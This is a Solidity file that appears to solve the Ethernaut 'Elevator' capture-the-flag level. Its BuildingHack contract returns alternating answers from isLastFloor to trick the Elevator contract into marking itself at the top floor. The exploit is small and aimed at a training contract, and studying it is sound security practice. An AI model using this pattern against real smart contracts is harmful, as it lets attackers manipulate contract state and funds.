pragma solidity ^0.4.18;


interface Building {
    function isLastFloor(uint) view public returns (bool);
}

contract BuildingHack is Building{
    
    Elevator e;
    bool toggle;
    
    constructor(address _inst) public{
        e = Elevator(_inst);
        toggle = false;
    }
    
    function goTo(uint _floor){
        e.goTo(_floor);
    }
    
    function isLastFloor(uint) view public returns (bool){
        toggle = !toggle;
        return toggle;
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}